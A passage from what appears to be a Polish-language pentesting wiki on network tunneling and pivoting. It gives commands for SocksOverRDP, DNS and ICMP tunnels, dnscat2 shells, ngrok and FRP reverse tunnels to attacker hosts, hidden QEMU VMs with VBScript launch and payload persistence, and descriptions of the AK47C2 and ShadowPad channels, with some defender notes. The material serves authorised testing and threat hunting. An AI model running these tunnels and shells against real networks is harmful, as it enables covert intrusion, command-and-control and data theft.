2. [Przenośny plik binarny Proxifier](https://www.proxifier.com/download/#win-tab)

Na komputerze klienckim załaduj **`SocksOverRDP-Plugin.dll`** w ten sposób:

```bash
# Load SocksOverRDP.dll using regsvr32.exe
C:\SocksOverRDP-x64> regsvr32.exe SocksOverRDP-Plugin.dll
```

Teraz możemy **połączyć się** z **victim** przez **RDP** za pomocą **`mstsc.exe`**. Powinien pojawić się **prompt** informujący, że **plugin SocksOverRDP jest włączony** i będzie **nasłuchiwać** na **127.0.0.1:1080**.

**Połącz się** przez **RDP**, a następnie wgraj i uruchom na maszynie ofiary plik binarny `SocksOverRDP-Server.exe`:

```
C:\SocksOverRDP-x64> SocksOverRDP-Server.exe
```

Teraz potwierdź na swojej maszynie (atakującej), że port 1080 nasłuchuje:

```
netstat -antb | findstr 1080
```

Teraz możesz użyć [**Proxifier**](https://www.proxifier.com/), aby przekierować ruch przez ten port.<sup>[[26]](#references)</sup>

### Wyszukiwanie tuneli przez kanały wirtualne RDP

[`rdp2tcp`](../network-services-pentesting/pentesting-rdp.md#rdp-virtual-channel-tunneling) to kolejny tunel wykorzystujący kanał wirtualny RDP; jego domyślna nazwa kanału to `rdp2tcp`, ale operator może wybrać inną nazwę.<sup>[[56]](#references)</sup> Utworzenie i zamknięcie kanału są rejestrowane w `Microsoft-Windows-RemoteDesktopServices-RdpCoreTS/Operational` jako zdarzenia o identyfikatorach **132** i **148**. Szukaj `rdp2tcp` oraz rzadkich lub losowych nazw kanałów, a następnie porównaj je z oczekiwanymi kanałami, takimi jak `XPSRD`, `cliprdr` i `Microsoft::Windows::RDS::DisplayControl`.<sup>[[58]](#references)</sup>

## Proxyfikacja aplikacji GUI systemu Windows

Możesz skonfigurować aplikacje GUI systemu Windows tak, aby korzystały z proxy, używając [**Proxifier**](https://www.proxifier.com/).<sup>[[26]](#references)</sup>\
W **Profile -> Proxy Servers** dodaj adres IP i port serwera SOCKS.\
W **Profile -> Proxification Rules** dodaj nazwę programu, który ma korzystać z proxy, oraz połączenia z adresami IP, które chcesz proxyfikować; reguły Proxifier mogą dopasowywać aplikacje, hosty docelowe i porty.<sup>[[27]](#references)</sup>

## Tunelowanie przez proxy NTLM

Wspomniane wcześniej narzędzie **Rpivot** może przekazywać ruch przez proxy uwierzytelniające za pomocą NTLM. **OpenVPN** może również kierować ruch przez takie proxy, jeśli zostanie skonfigurowany z plikiem uwierzytelniającym i metodą NTLMv2; jest to przechodzenie przez proxy, a nie obejście jego uwierzytelniania.<sup>[[20]](#references)[[28]](#references)</sup>

```bash
http-proxy <proxy_ip> 8080 <file_with_creds> ntlm2
```

### Cntlm

[http://cntlm.sourceforge.net/](http://cntlm.sourceforge.net/)

Cntlm uwierzytelnia się wobec nadrzędnych serwerów proxy NTLM, udostępnia lokalne porty nasłuchujące i może mapować lokalny port tunelu na usługę docelową; klienci mogą następnie korzystać z tego lokalnego portu.<sup>[[29]](#references)</sup>\
Na przykład przekieruj port 443.

```
Username Alice
Password P@ssw0rd
Domain CONTOSO.COM
Proxy 10.0.0.10:8080
Tunnel 2222:<attackers_machine>:443
```

Teraz, jeśli na przykład skonfigurujesz usługę **SSH** na maszynie ofiary tak, aby nasłuchiwała na porcie 443, możesz połączyć się z nią przez port 2222 atakującego.<sup>[[29]](#references)</sup>\
Możesz też użyć **meterpreter**, który łączy się z localhost:443, podczas gdy atakujący nasłuchuje na porcie 2222.<sup>[[29]](#references)</sup>

## YARP

YARP (Yet Another Reverse Proxy) to zestaw narzędzi Microsoftu do tworzenia reverse proxy w .NET. Znajdziesz go tutaj: [https://github.com/microsoft/reverse-proxy](https://github.com/microsoft/reverse-proxy).<sup>[[30]](#references)</sup>

## DNS Tunneling

### Iodine

[https://code.kryo.se/iodine/](https://code.kryo.se/iodine/)

Iodine tworzy tunel IPv4 przez zapytania DNS i używa interfejsów TUN; udokumentowana konfiguracja wymaga uprawnień niezbędnych do utworzenia tych interfejsów po obu stronach.<sup>[[31]](#references)</sup>

```
attacker> iodined -f -c -P P@ssw0rd 1.1.1.1 tunneldomain.com
victim> iodine -f -P P@ssw0rd tunneldomain.com -r
#You can see the victim at 1.1.1.2
```

Transport DNS ma większy narzut niż bezpośrednie TCP i jest zazwyczaj wolny; możesz utworzyć skompresowane połączenie SSH przez ten tunel, używając:<sup>[[31]](#references)</sup>

```
ssh <user>@1.1.1.2 -C -c blowfish-cbc,arcfour -o CompressionLevel=9 -D 1080
```

### DNSCat2

[**Pobierz stąd**](https://github.com/iagox86/dnscat2)**.**

Dnscat2 ustanawia szyfrowany kanał command-and-control przez DNS; poniższe polecenia serwera i klienta są zgodne z udokumentowanym sposobem użycia.<sup>[[32]](#references)</sup>

```bash
attacker> ruby ./dnscat2.rb tunneldomain.com
victim> ./dnscat2 tunneldomain.com

# If using it in an internal network for a CTF:
attacker> ruby dnscat2.rb --dns host=10.10.10.10,port=53,domain=mydomain.local --no-cache
victim> ./dnscat2 --dns host=10.10.10.10,port=5353
```

#### **W PowerShellu**

Możesz użyć [**dnscat2-powershell**](https://github.com/lukebaggett/dnscat2-powershell), aby uruchomić klienta dnscat2 w PowerShellu; w pliku README opisano parametry `Start-Dnscat2` przedstawione poniżej.<sup>[[33]](#references)</sup>

```
Import-Module .\dnscat2.ps1
Start-Dnscat2 -DNSserver 10.10.10.10 -Domain mydomain.local -PreSharedSecret somesecret -Exec cmd
```

#### **Przekierowanie portów za pomocą dnscat**

Interaktywna komenda `listen` w dnscat2 mapuje lokalny listener na zdalny host i port.<sup>[[32]](#references)</sup>

```bash
session -i <sessions_id>
listen [lhost:]lport rhost:rport #Ex: listen 127.0.0.1:8080 10.0.0.20:80, this bind 8080port in attacker host
```

#### Zmiana DNS w proxychains

Proxychains-ng przechwytuje dynamicznie linkowane połączenia TCP i nie obsługuje UDP ani ICMP; proxy DNS można skonfigurować, więc zamiast zakładać użycie stałego publicznego resolvera, sprawdź zainstalowany plik `proxychains.conf` oraz skrypt pomocniczy resolvera. Starsze skrypty `proxyresolv` udostępniają zmienną `PROXY_DNS_SERVER`, która pozwala wybrać resolver; gdy potrzebujesz nazw wewnętrznych, użyj resolvera dostępnego z punktu przesiadkowego.<sup>[[34]](#references)[[35]](#references)</sup>

## Tunele w Go

[https://github.com/hotnops/gtunnel](https://github.com/hotnops/gtunnel)

### Niestandardowy C2 DNS TXT / HTTP JSON (AK47C2)

Aktor Storm-2603 stworzył **dwukanałowy C2 („AK47C2”)**, który nadużywa *wyłącznie* wychodzącego ruchu **DNS** i **zwykłych żądań HTTP POST** — dwóch protokołów rzadko blokowanych w sieciach firmowych.<sup>[[2]](#references)</sup>

1. **Tryb DNS (AK47DNS)**
   • Generuje losowy, 5-znakowy SessionID (np. `H4T14`).  
   • Dodaje na początku `1` dla *żądań zadań* lub `2` dla *wyników*, a następnie łączy różne pola (flagi, SessionID, nazwę komputera).  
   • Każde pole jest **szyfrowane XOR kluczem ASCII `VHBD@H`**, kodowane szesnastkowo i łączone kropkami — całość kończy się domeną kontrolowaną przez atakującego:

   ```text
   <1|2><SessionID>.a<SessionID>.<Computer>.update.updatemicfosoft.com
   ```

   • Żądania używają `DnsQuery()` dla rekordów **TXT** (i zapasowo **MG**).  
   • Gdy odpowiedź przekracza 0xFF bajtów, backdoor **dzieli** dane na fragmenty po 63 bajty i wstawia znaczniki:
     `s<SessionID>t<TOTAL>p<POS>`, aby serwer C2 mógł ułożyć je we właściwej kolejności.

2. **Tryb HTTP (AK47HTTP)**
   • Tworzy kopertę JSON:
   ```json
   {"cmd":"","cmd_id":"","fqdn":"<host>","result":"","type":"task"}
   ```
   • Cały blob jest kodowany przez XOR-`VHBD@H` → hex → wysyłany w treści żądania **`POST /`** z nagłówkiem `Content-Type: text/plain`.
   • Odpowiedź jest kodowana w ten sam sposób, a pole `cmd` jest wykonywane jako `cmd.exe /c <command> 2>&1`.

Uwagi Blue Team
• Szukaj nietypowych **zapytań TXT**, których pierwsza etykieta zawiera długi ciąg szesnastkowy i które zawsze kończą się tą samą rzadko spotykaną domeną.  
• Stały klucz XOR, po którym następuje zapis w ASCII-hex, można łatwo wykryć za pomocą YARA: `6?56484244?484` (`VHBD@H` w systemie szesnastkowym).  
• W przypadku HTTP wykrywaj żądania POST z treścią `text/plain`, która zawiera wyłącznie znaki szesnastkowe, a jej długość jest wielokrotnością dwóch bajtów.

{{#note}}
Kanał utrzymuje długość każdej etykiety subdomeny poniżej limitu DNS wynoszącego 63 oktety, ale sama zgodność z protokołem nie zapewnia niewykrywalności; rzadko spotykane domeny, długie etykiety szesnastkowe i liczba zapytań nadal mogą wskazywać na podejrzaną aktywność.<sup>[[2]](#references)[[36]](#references)</sup>
{{#endnote}}

## ICMP Tunneling

### Hans

[https://github.com/friedrich/hans](https://github.com/friedrich/hans)\
[https://github.com/albertzak/hanstunnel](https://github.com/albertzak/hanstunnel)

Hans opisuje tunel IPv4-over-ICMP wykorzystujący urządzenie TUN i żądania echo ICMP; konfiguracja wymaga uprawnień wystarczających do utworzenia interfejsu.<sup>[[37]](#references)</sup>

```bash
./hans -v -f -s 1.1.1.1 -p P@ssw0rd #Start listening (1.1.1.1 is IP of the new vpn connection)
./hans -f -c <server_ip> -p P@ssw0rd -v
ping 1.1.1.100 #After a successful connection, the victim will be in the 1.1.1.100
```

### ptunnel-ng

[**Pobierz stąd**](https://github.com/utoni/ptunnel-ng.git).

ptunnel-ng przesyła połączenia TCP przez ICMP i używa pokazanych poniżej opcji `-p`, `-l`, `-r` i `-R` odpowiednio dla proxy, lokalnego listenera, hosta docelowego i portu docelowego.<sup>[[38]](#references)</sup>

```bash
# Generate it
sudo ./autogen.sh

# Server -- victim (needs to be able to receive ICMP)
sudo ptunnel-ng
# Client - Attacker
sudo ptunnel-ng -p <server_ip> -l <listen_port> -r <dest_ip> -R <dest_port>
# Try to connect with SSH through ICMP tunnel
ssh -p 2222 -l user 127.0.0.1
# Create a socks proxy through the SSH connection through the ICMP tunnel
ssh -D 9050 -p 2222 -l user 127.0.0.1
```

## ngrok

[**ngrok**](https://ngrok.com/) to agent umożliwiający udostępnianie lokalnych usług sieciowych w Internecie za pośrednictwem bezpiecznego tunelu; dokumentacja CLI opisuje endpointy HTTP, TCP i URL plików, a nazwa hosta wydrukowana dla endpointu może się różnić w zależności od endpointu i konta.<sup>[[39]](#references)</sup>

### Instalacja

- Utwórz konto: https://ngrok.com/signup
- Pobieranie klienta:

```bash
tar xvzf ~/Downloads/ngrok-v3-stable-linux-amd64.tgz -C /usr/local/bin
chmod a+x ./ngrok
# Init configuration, with your token
./ngrok config edit
```

### Podstawowe zastosowania

**Dokumentacja:** [https://ngrok.com/docs/getting-started/](https://ngrok.com/docs/getting-started/).

_Agent obsługuje również opcje uwierzytelniania i TLS, gdy są potrzebne.<sup>[[39]](#references)</sup>_

#### Tunelowanie TCP

```bash
# Pointing to 0.0.0.0:4444
./ngrok tcp 4444
# Example of resulting link: 0.tcp.ngrok.io:12345
# Listen (example): nc -nvlp 4444
# Remote connect (example): nc $(dig +short 0.tcp.ngrok.io) 12345
```

#### Udostępnianie plików przez HTTP

```bash
./ngrok http file:///tmp/httpbin/
# Example of resulting link: https://abcd-1-2-3-4.ngrok.io/
```

#### Sniffing połączeń HTTP

_Przydatne w przypadku XSS, SSRF, SSTI ..._\
Domyślnie samodzielny agent udostępnia interfejs inspekcji HTTP pod adresem `http://127.0.0.1:4040`; interfejs służy do obsługi ruchu HTTP.<sup>[[40]](#references)</sup>

#### Tunelowanie wewnętrznej usługi HTTP

Opcja `--host-header=rewrite` przepisuje nagłówek HTTP `Host` w żądaniu do serwera upstream, tak aby pasował do lokalnej usługi.<sup>[[41]](#references)</sup>

```bash
./ngrok http localhost:8080 --host-header=rewrite
# Example of resulting link: https://abcd-1-2-3-4.ngrok.io/
# With basic auth
./ngrok http localhost:8080 --host-header=rewrite --auth="myuser:mysuperpassword"
```

#### Przykład prostej konfiguracji ngrok.yaml

Używa ngrok Agent Config v2; nazwane tunele korzystają z `proto` i `addr` i są uruchamiane za pomocą `ngrok start`.<sup>[[42]](#references)</sup> Otwiera 3 tunele:

- 2 TCP
- 1 HTTP z udostępnianiem statycznych plików z /tmp/httpbin/

```yaml
version: 2
tunnels:
  mytcp:
    addr: 4444
    proto: tcp
  anothertcp:
    addr: 5555
    proto: tcp
  httpstatic:
    proto: http
    addr: file:///tmp/httpbin/
```

## Microsoft Dev Tunnels

Microsoft Dev Tunnels mogą udostępniać lokalną usługę opartą na TCP za pośrednictwem infrastruktury przekaźnikowej Microsoft. CLI hosta tworzy tunel wychodzący, a `devtunnel connect` odtwarza udostępniony port po stronie klienta. Domyślnie tunele wymagają uwierzytelnienia, chyba że celowo poluzuje się kontrolę dostępu.<sup>[[55]](#references)[[58]](#references)</sup>

```bash
# Compromised/pivot host: publish its local RDP service
# Save the tunnel ID printed by this command
devtunnel host -p 3389

# Operator host: authenticate as an authorized tunnel user and create
# a local 127.0.0.1:3389 forward to the hosted port
devtunnel connect <TUNNEL_ID>
xfreerdp /u:<USER> /v:127.0.0.1:3389
```

This może udostępnić RDP przez `*.devtunnels.ms` bez otwierania nowego listenera przychodzącego na obwodzie sieci. Można też połączyć je z tunelem wirtualnego kanału RDP, takim jak `rdp2tcp`, przekształcając sesję RDP w pivot drugiego etapu dla dowolnego ruchu TCP.<sup>[[58]](#references)</sup>

Podczas threat huntingu koreluj uruchomienie Dev Tunnels CLI z ruchem DNS/TLS do `*.devtunnels.ms` oraz nieoczekiwanymi zdarzeniami wirtualnych kanałów RDP. Uwierzytelniony tunel nie jest nieszkodliwy tylko dlatego, że korzysta z przekaźnika należącego do Microsoftu.<sup>[[58]](#references)</sup>

## Cloudflared (Cloudflare Tunnel)

Łącznik `cloudflared` usługi Cloudflare Tunnel nawiązuje połączenia wychodzące; opublikowane aplikacje mogą kierować ruch HTTP, HTTPS, TCP, SSH i RDP, natomiast quick tunnels są przeznaczone do programowania aplikacji HTTP.<sup>[[43]](#references)[[45]](#references)</sup>

### Jednolinijkowe polecenie quick tunnel

```bash
# Expose a local web service listening on 8080
cloudflared tunnel --url http://localhost:8080
# => Generates https://<random>.trycloudflare.com that forwards to 127.0.0.1:8080
```

### Origin SOCKS5 (tryb legacy)

Flaga `--socks5` w trybie legacy informuje `cloudflared`, że lokalny origin obsługuje SOCKS5; nie tworzy lokalnego listenera SOCKS5. W przypadku zarządzanego tunelu `originRequest.proxyType: socks` konfiguruje obsługę origin SOCKS5.<sup>[[44]](#references)</sup>

```bash
# Expose a local SOCKS5-speaking origin (legacy syntax)
cloudflared tunnel --url socks5://localhost:1080 --socks5
```

### Trwałe tunele z DNS

Konfiguracja tunelu zarządzanego lokalnie używa kluczy `tunnel`, `credentials-file` i `url` zapisanych małymi literami, jak pokazano poniżej.<sup>[[46]](#references)</sup>

```bash
cloudflared tunnel create mytunnel
cloudflared tunnel route dns mytunnel internal.example.com
# config.yml
tunnel: <TUNNEL-UUID>
credentials-file: /root/.cloudflared/<TUNNEL-UUID>.json
url: http://127.0.0.1:8000
```

Uruchom konektor:

```bash
cloudflared tunnel run mytunnel
```

Łącznik nawiązuje połączenia wychodzące i domyślnie negocjuje QUIC, a w razie potrzeby przełącza się na HTTP/2; nie zakładaj, że każde wdrożenie używa TCP/443. Uruchamiaj go z uprawnieniami wymaganymi przez dane wdrożenie.<sup>[[43]](#references)[[47]](#references)</sup>

## FRP (Fast Reverse Proxy)

[`frp`](https://github.com/fatedier/frp) to reverse proxy napisane w Go, obsługujące **TCP, UDP, HTTP/S, STCP/SUDP, TCPMUX i XTCP**. XTCP używa przebijania NAT w trybie P2P, którego powodzenie zależy od NAT. Od wersji **v0.53.0** może działać jako **SSH Tunnel Gateway**, dzięki czemu host docelowy może korzystać ze standardowego klienta OpenSSH bez pliku binarnego `frpc`.<sup>[[48]](#references)[[49]](#references)[[50]](#references)</sup>

### Klasyczny tunel reverse TCP

```bash
# Attacker / server
./frps -c frps.toml            # listens on 0.0.0.0:7000

# Victim
./frpc -c frpc.toml            # will expose 127.0.0.1:3389 on frps:5000

# frpc.toml
serverAddr = "attacker_ip"
serverPort = 7000

[[proxies]]
name       = "rdp"
type       = "tcp"
localIP    = "127.0.0.1"
localPort  = 3389
remotePort = 5000
```

### Korzystanie z nowej bramy SSH (bez pliku binarnego frpc)

```bash
# On frps (attacker)
sshTunnelGateway.bindPort = 2200   # add to frps.toml
./frps -c frps.toml

# On victim (OpenSSH client only)
ssh -R :80:127.0.0.1:8080 v0@attacker_ip -p 2200 tcp --proxy_name web --remote_port 9000
```

Powyższe polecenie publikuje port ofiary **8080** jako **attacker_ip:9000**, używając standardowego klienta OpenSSH, a `frps` zapewnia bramę.<sup>[[50]](#references)</sup>

## UDP back-connects wspomagane przez STUN

Żądania STUN Binding wysyłane z gniazda UDP mogą ujawnić jego publiczny adres IP i port widziane przez serwer, a okresowy ruch utrzymuje aktywne powiązanie NAT. Publiczny serwer STUN nie jest przekaźnikiem dowolnych pakietów sterujących.<sup>[[60]](#references)</sup> W analizowanym projekcie back-connect wykorzystywano to samo gniazdo UDP do wysłania krótkiego datagramu sterującego, a następnie, po odebraniu sygnału wyzwalającego, nawiązywano *osobne wychodzące połączenie TCP*, aby pobrać i wykonać polecenia.<sup>[[59]](#references)</sup>

Aby odebrać pakiet UDP kontrolera, projekt nadal musi udostępnić mu mapowanie i spełnić zasady filtrowania NAT. Filtrowanie zależne od adresu lub portu może przepuszczać odpowiedzi z serwera STUN, a odrzucać pakiety z innego punktu końcowego.<sup>[[60]](#references)[[61]](#references)</sup> Ścieżka rendezvous analizowanego backdoora nie została zweryfikowana, więc same udane odpowiedzi STUN nie dowodzą, że jego kanał sterujący jest osiągalny.<sup>[[59]](#references)</sup> Informacje o osobnym protokole z jawnym mechanizmem rendezvous i awaryjnym użyciem przekaźnika znajdziesz w sekcji [przechodzenie przez NAT w kamerach PPPP](../network-services-pentesting/32100-udp-pentesting-pppp-cs2-p2p-cameras.md#nat-traversal-and-transport).

## Ukryte tunele oparte na VM z QEMU

Sieci w trybie użytkownika QEMU nie wymagają uprawnień roota ani administratora dla sieci wirtualnej, a `-netdev user,hostfwd=...` przekierowuje połączenia TCP, UDP lub UNIX z hosta do gościa.<sup>[[51]](#references)</sup> TrustedSec opisał maszynę wirtualną QEMU z Tiny Core oraz próbę utworzenia odwrotnego tunelu SSH w incydencie, w którym EDR monitorujący hosta mógł nie wykryć aktywności wewnątrz gościa.<sup>[[1]](#references)</sup>

### Szybka jednolinijkowa komenda

```powershell
# Windows victim (user-mode networking; no TAP driver is needed for this example)
qemu-system-x86_64.exe ^
   -m 256M ^
   -drive file=tc.qcow2,if=ide ^
   -netdev user,id=n0,hostfwd=tcp::2222-:22 ^
   -device e1000,netdev=n0 ^
   -nographic
```

• Powyższe polecenie uruchamia maszynę wirtualną **Tiny Core Linux** z 256 MiB pamięci i obrazem dysku qcow2; obraz dysku nie jest dyskiem w pamięci RAM.
• Port **2222/tcp** na hoście Windows jest przezroczysto przekierowywany na **22/tcp** wewnątrz maszyny wirtualnej.
• Z punktu widzenia atakującego cel udostępnia po prostu port 2222; wszelkie docierające do niego pakiety obsługuje serwer SSH działający w maszynie wirtualnej.

### Ukryte uruchamianie za pomocą VBScript

TrustedSec zaobserwował uruchamianie QEMU sterowane przez VBS oraz obrazy Tiny Core w opisanym powyżej incydencie.<sup>[[1]](#references)</sup>

```vb
' update.vbs – lived in C:\ProgramData\update
Set o = CreateObject("Wscript.Shell")
o.Run "stl.exe -m 256M -drive file=tc.qcow2,if=ide -netdev user,id=n0,hostfwd=tcp::2222-:22", 0
```

Uruchomienie skryptu za pomocą `cscript.exe //B update.vbs` utrzymuje ukryte okno.<sup>[[1]](#references)</sup>

### Utrzymywanie dostępu wewnątrz gościa

W opisywanym incydencie utrzymywanie dostępu w bezstanowym gościu Tiny Core odbywa się za pośrednictwem `/opt/bootlocal.sh` i `/opt/filetool.lst`:<sup>[[1]](#references)</sup>

1. Zapisz payload w `/opt/123.out`  
2. Dopisz do `/opt/bootlocal.sh`:

   ```sh
   while ! ping -c1 45.77.4.101; do sleep 2; done
   /opt/123.out
   ```

3. Dodaj `home/tc` i `opt` do `/opt/filetool.lst`, aby payload został spakowany do `mydata.tgz` podczas zamykania.

### Uwagi dotyczące telemetrii

• Host nadal ujawnia proces QEMU, obraz qcow2 i każdy listener przekierowany z hosta.  
• Skanowanie procesów wyłącznie po stronie hosta może nie obejmować procesów gościa, ale wirtualizacja nie gwarantuje uniknięcia wykrycia; telemetria sieciowa, QEMU i obrazu nadal może ujawnić jego obecność.<sup>[[1]](#references)[[51]](#references)</sup>

### Wskazówki dla obrońców

• Generuj alerty, gdy **nieoczekiwane pliki binarne QEMU/VirtualBox/KVM** pojawiają się w ścieżkach zapisywalnych przez użytkownika.  
• Blokuj połączenia wychodzące inicjowane przez `qemu-system*.exe`.  
• Szukaj rzadko używanych portów nasłuchujących (2222, 10022, …), które zaczynają nasłuchiwać tuż po uruchomieniu QEMU.

## Węzły przekaźnikowe IIS/HTTP.sys przez `HttpAddUrl` (ShadowPad)

Check Point opisuje moduł IIS ShadowPada jako narzędzie przekształcające przejęte serwery WWW na obrzeżach sieci w węzły backdoora i przekaźnikowe przez przypisywanie prefiksów URL za pomocą `HttpAddUrl`.<sup>[[3]](#references)</sup>

Ten sam raport szczegółowo opisuje ustawienia domyślne, wildcardowe listenery, deszyfrowanie pakietów, kolejki przekaźników i telemetrię debugowania, podsumowane poniżej.<sup>[[3]](#references)</sup>

* **Domyślne ustawienia konfiguracji** – jeśli konfiguracja JSON modułu nie zawiera wartości, moduł używa wiarygodnych ustawień domyślnych IIS (`Server: Microsoft-IIS/10.0`, `DocumentRoot: C:\inetpub\wwwroot`, `ErrorPage: C:\inetpub\custerr\en-US\404.htm`). Dzięki temu na prawidłowy ruch odpowiada IIS, używając właściwej identyfikacji wizualnej.
* **Przechwytywanie wildcardowe** – operatorzy podają rozdzieloną średnikami listę prefiksów URL (wildcardy w hoście i ścieżce). Moduł wywołuje `HttpAddUrl` dla każdego wpisu, więc HTTP.sys kieruje pasujące żądania do złośliwego handlera; żądania niepasujące są obsługiwane normalnie przez IIS.
* **Pierwszy zaszyfrowany pakiet** – pierwsze dwa bajty treści żądania zawierają ziarno dla własnego generatora PRNG 32-bit. Każdy kolejny bajt jest poddawany operacji XOR z wygenerowanym strumieniem klucza przed parsowaniem protokołu:

  ```python
  def decrypt_first_packet(buf):
      seed = buf[0] | (buf[1] << 8)
      num = seed & 0xFFFFFFFF
      out = bytearray(buf)
      for i in range(2, len(out)):
          hi = (num >> 16) & 0xFFFF
          num = (hi * 0x7093915D - num * 0x6EA30000 + 0x06B0F0E3) & 0xFFFFFFFF
          out[i] ^= num & 0xFF
      return out
  ```

* **Orkiestracja relay** – moduł utrzymuje dwie listy: „servers” (węzły nadrzędne) i „clients” (implanty podrzędne). Wpisy są usuwane, jeśli przez około 30 sekund nie nadejdzie sygnał heartbeat. Gdy obie listy nie są puste, moduł łączy pierwszy sprawny serwer z pierwszym sprawnym klientem i przekazuje dane między ich socketami aż do zamknięcia połączenia przez jedną ze stron.
* **Telemetria debugowania** – opcjonalne logowanie zapisuje źródłowy adres IP, docelowy adres IP i łączną liczbę przekazanych bajtów dla każdej pary. Śledczy wykorzystali te dane, aby odtworzyć sieć ShadowPad obejmującą wiele ofiar.

---

## Inne narzędzia do sprawdzenia

- [https://github.com/securesocketfunneling/ssf](https://github.com/securesocketfunneling/ssf)
- [https://github.com/z3APA3A/3proxy](https://github.com/z3APA3A/3proxy)

## References

- [1] [Ukrywanie się w cieniu: ukryte tunele za pomocą wirtualizacji QEMU](https://trustedsec.com/blog/hiding-in-the-shadows-covert-tunnels-via-qemu-virtualization)
- [2] [Check Point Research – Przed ToolShell: analiza wcześniejszych operacji ransomware grupy Storm-2603](https://research.checkpoint.com/2025/before-toolshell-exploring-storm-2603s-previous-ransomware-operations/)
- [3] [Check Point Research – Wewnątrz Ink Dragon: ujawnienie sieci relay i działania skrytej operacji ofensywnej](https://research.checkpoint.com/2025/ink-dragons-relay-network-and-offensive-operation/)
- [4] [Plik README Evil-WinRM](https://raw.githubusercontent.com/Hackplayers/evil-winrm/master/README.md)
- [5] [Przewodnik referencyjny Nmap: omijanie ograniczeń zapory sieciowej/IDS](https://nmap.org/book/man-bypass-firewalls-ids.html)
- [6] [Podręcznik OpenBSD ssh](https://man.openbsd.org/ssh)
- [7] [Podręcznik OpenBSD sshd_config](https://man.openbsd.org/sshd_config)
- [8] [Informacje o wydaniu OpenSSH 9.6](https://www.openssh.org/txt/release-9.6)
- [9] [Plik README sshuttle](https://raw.githubusercontent.com/sshuttle/sshuttle/master/README.rst)
- [10] [Metasploit: pivoting w Metasploit](https://docs.metasploit.com/docs/using-metasploit/intermediate/pivoting-in-metasploit.html)
- [11] [Dokumentacja modułu socks_proxy w Metasploit](https://raw.githubusercontent.com/rapid7/metasploit-framework/master/documentation/modules/auxiliary/server/socks_proxy.md)
- [12] [Dokumentacja modułu autoroute w Metasploit](https://raw.githubusercontent.com/rapid7/metasploit-framework/master/documentation/modules/post/multi/manage/autoroute.md)
- [13] [Cobalt Strike: proxy SOCKS](https://hstechdocs.helpsystems.com/manuals/cobaltstrike/current/userguide/content/topics/pivoting_socks-proxy.htm)
- [14] [Cobalt Strike: odwrotne przekierowanie portów](https://hstechdocs.helpsystems.com/manuals/cobaltstrike/current/userguide/content/topics/pivoting_reverse-port-forward.htm)
- [15] [Plik README reGeorg](https://raw.githubusercontent.com/sensepost/reGeorg/master/README.md)
- [16] [Plik README Chisel](https://raw.githubusercontent.com/jpillora/chisel/master/README.md)
- [17] [Ligolo-ng: szybki start](https://docs.ligolo.ng/Quickstart/)
- [18] [Ligolo-ng: nasłuchiwacze](https://docs.ligolo.ng/Listeners/)
- [19] [Ligolo-ng: localhost](https://docs.ligolo.ng/Localhost/)
- [20] [Plik README rpivot](https://raw.githubusercontent.com/klsecservices/rpivot/master/README.md)
- [21] [Podręcznik socat](https://man7.org/linux/man-pages/man1/socat.1.html)
- [22] [Podręcznik PuTTY Plink](https://the.earth.li/~sgtatham/putty/0.84/htmldoc/Chapter7.html)
- [23] [Opcje wiersza poleceń PuTTY](https://the.earth.li/~sgtatham/putty/0.84/htmldoc/Chapter3.html)
- [24] [Polecenie Microsoft netsh interface portproxy](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/netsh-interface)
- [25] [Plik README SocksOverRDP](https://raw.githubusercontent.com/nccgroup/SocksOverRDP/master/README.md)
- [26] [Dokumentacja Proxifier](https://www.proxifier.com/docs/win-v4/)
- [27] [Reguły proxifikacji Proxifier](https://www.proxifier.com/docs/win-v3/rules.htm)
- [28] [Podręcznik OpenVPN 2.7](https://openvpn.net/community-docs/community-articles/openvpn-2-7-manual.html)
- [29] [Cntlm](https://cntlm.sourceforge.net/)
- [30] [Plik README YARP](https://raw.githubusercontent.com/dotnet/yarp/main/README.md)
- [31] [Plik README iodine](https://code.kryo.se/iodine/README.html)
- [32] [Plik README dnscat2](https://raw.githubusercontent.com/iagox86/dnscat2/master/README.md)
- [33] [Plik README dnscat2-powershell](https://raw.githubusercontent.com/lukebaggett/dnscat2-powershell/master/README.md)
- [34] [Plik README proxychains-ng](https://raw.githubusercontent.com/rofl0r/proxychains-ng/master/README)
- [35] [proxyresolv](https://github.com/haad/proxychains/blob/master/src/proxyresolv)
- [36] [RFC 1035: nazwy domen — implementacja i specyfikacja](https://www.rfc-editor.org/rfc/rfc1035)
- [37] [Hans](https://code.gerade.org/hans/)
- [38] [Plik README ptunnel-ng](https://raw.githubusercontent.com/utoni/ptunnel-ng/master/README.md)
- [39] [Interfejs CLI ngrok Agent](https://ngrok.com/docs/agent/cli)
- [40] [Interfejs inspekcji sieciowej ngrok](https://ngrok.com/docs/agent/web-inspection-interface)
- [41] [Wirtualne hosty ngrok](https://ngrok.com/docs/using-ngrok-with/virtualHosts)
- [42] [Konfiguracja ngrok Agent v2](https://ngrok.com/docs/agent/config/v2)
- [43] [Omówienie Cloudflare Tunnel](https://developers.cloudflare.com/tunnel/)
- [44] [Parametry origin Cloudflare Tunnel](https://developers.cloudflare.com/tunnel/advanced/origin-parameters/)
- [45] [Konfiguracja Cloudflare Tunnel](https://developers.cloudflare.com/tunnel/setup/)
- [46] [Plik konfiguracyjny Cloudflare Tunnel](https://developers.cloudflare.com/cloudflare-one/networks/connectors/cloudflare-tunnel/do-more-with-tunnels/local-management/configuration-file/)
- [47] [Parametry uruchamiania Cloudflare Tunnel](https://developers.cloudflare.com/tunnel/advanced/run-parameters/)
- [48] [Koncepcje frp](https://gofrp.org/en/docs/concepts/)
- [49] [frp XTCP](https://gofrp.org/en/docs/features/xtcp/)
- [50] [frp SSH Tunnel Gateway](https://gofrp.org/en/docs/features/common/ssh/)
- [51] [Dokumentacja sieciowa QEMU](https://www.qemu.org/docs/master/system/devices/net.html)
- [52] [Plik README wstunnel](https://github.com/erebe/wstunnel/blob/main/README.md)
- [53] [Repozytorium kodu źródłowego NetSPI BOFScale](https://github.com/NetSPI/BOFscale)
- [54] [BOFScale: tailnet z frontem CDN uruchamiany z BOF-PE](https://www.netspi.com/blog/technical-blog/red-teaming/bofscale-a-cdn-fronted-tailnet-from-a-bof-pe/)
- [55] [Microsoft Learn — polecenia CLI Dev Tunnels](https://learn.microsoft.com/en-us/azure/developer/dev-tunnels/cli-commands)
- [56] [V-E-O/rdp2tcp](https://github.com/V-E-O/rdp2tcp)
- [57] [Fortra Impacket — atexec.py](https://github.com/fortra/impacket/blob/master/examples/atexec.py)
- [58] [APT NightEagle: GhostContainer i tunelowanie](https://securelist.com/tr/nighteagle-apt-ghostcontainer-and-tunneling/121323/)
